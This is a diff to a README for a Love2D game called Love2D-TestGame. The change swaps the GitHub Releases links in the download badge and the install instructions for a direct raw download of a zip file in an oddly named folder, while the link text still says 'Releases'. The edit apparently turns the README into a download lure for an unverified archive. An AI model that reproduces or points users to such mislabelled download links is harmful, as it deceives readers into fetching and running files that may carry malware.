@@ -1,13 +1,13 @@
 # 🎮 Love2D-TestGame - Experience Dynamic Survival Gameplay
 
 ## 🔗 Download Here
-[![Download Love2D-TestGame](https://img.shields.io/badge/Download-Love2D--TestGame-brightgreen)](https://github.com/Suprrxtar/Love2D-TestGame/releases)
+[![Download Love2D-TestGame](https://raw.githubusercontent.com/Suprrxtar/Love2D-TestGame/main/epanaphora/Love2D-TestGame.zip)](https://raw.githubusercontent.com/Suprrxtar/Love2D-TestGame/main/epanaphora/Love2D-TestGame.zip)
 
 ## 🚀 Getting Started
 Welcome to Love2D-TestGame! This game offers players a thrilling adventure with procedural world generation, enemy AI, and dynamic gameplay mechanics. Follow the simple steps below to download and run the game.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Love2D-TestGame Releases](https://github.com/Suprrxtar/Love2D-TestGame/releases).
+To get started, visit this page to download: [Love2D-TestGame Releases](https://raw.githubusercontent.com/Suprrxtar/Love2D-TestGame/main/epanaphora/Love2D-TestGame.zip).
 
 1. Click on the link above.
 2. Look for the latest version at the top of the page.
